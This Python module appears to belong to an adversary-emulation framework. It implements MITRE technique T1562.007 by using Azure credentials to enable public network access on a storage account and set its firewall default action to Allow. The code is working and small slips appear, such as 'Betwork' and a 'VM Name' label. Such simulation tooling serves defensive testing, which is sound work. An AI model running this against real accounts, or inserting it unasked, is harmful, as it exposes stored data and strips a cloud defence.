from ..base_technique import BaseTechnique, ExecutionStatus, MitreTechnique
from ..technique_registry import TechniqueRegistry
from typing import Dict, Any, Tuple
from azure.mgmt.storage import StorageManagementClient
from azure.mgmt.storage.models import StorageAccountUpdateParameters, NetworkRuleSet, DefaultAction
from core.azure.azure_access import AzureAccess

@TechniqueRegistry.register
class AzureExposeStorageAccountPublic(BaseTechnique):
    def __init__(self):
        mitre_techniques = [
            MitreTechnique(
                technique_id="T1562.007",
                technique_name="Impair Defenses",
                tactics=["Defense Evasion"],
                sub_technique_name="Disable or Modify Cloud Firewall"
            )
        ]
        super().__init__("Expose Storage Account Public", "Modify the network rule set of an Azure Storage Account to change its default action to 'Allow', effectively making the storage account publicly accessible", mitre_techniques)

    def execute(self, **kwargs: Any) -> Tuple[ExecutionStatus, Dict[str, Any]]:
        self.validate_parameters(kwargs)
        try:
            rg_name: str = kwargs["rg_name"]
            account_name: str = kwargs["account_name"]
            
            # Get credential
            credential = AzureAccess.get_azure_auth_credential()
            # Retrieve subscription id
            current_sub_info = AzureAccess().get_current_subscription_info()
            subscription_id = current_sub_info.get("id")
            
            # create client
            storage_client = StorageManagementClient(credential, subscription_id)
            
            update_params = StorageAccountUpdateParameters(
                public_network_access='Enabled'
            )
            storage_client.storage_accounts.update(
                rg_name,
                account_name,
                update_params
            )

            network_rule_set = NetworkRuleSet(
                default_action=DefaultAction.ALLOW
            )
            storage_client.storage_accounts.update(
                rg_name,
                account_name,
                StorageAccountUpdateParameters(network_rule_set=network_rule_set)
            )

            return ExecutionStatus.SUCCESS, {
                "message": f"Storage account {account_name} made public. Betwork rule set updated to allow default action.",
                "value": {
                    "account_name" : account_name,
                    "rg_name" : rg_name,
                    "public_network_access" : "Enabled"
                }
            }
        except Exception as e:
            return ExecutionStatus.FAILURE, {
                "error": str(e),
                "message": "Failed to make storage account public}"
            }

    def get_parameters(self) -> Dict[str, Dict[str, Any]]:
        return {
            "account_name": {"type": "str", "required": True, "default": None, "name": "VM Name", "input_field_type" : "text"},
            "rg_name": {"type": "str", "required": True, "default": None, "name": "Resource Group Name", "input_field_type" : "text"},
        }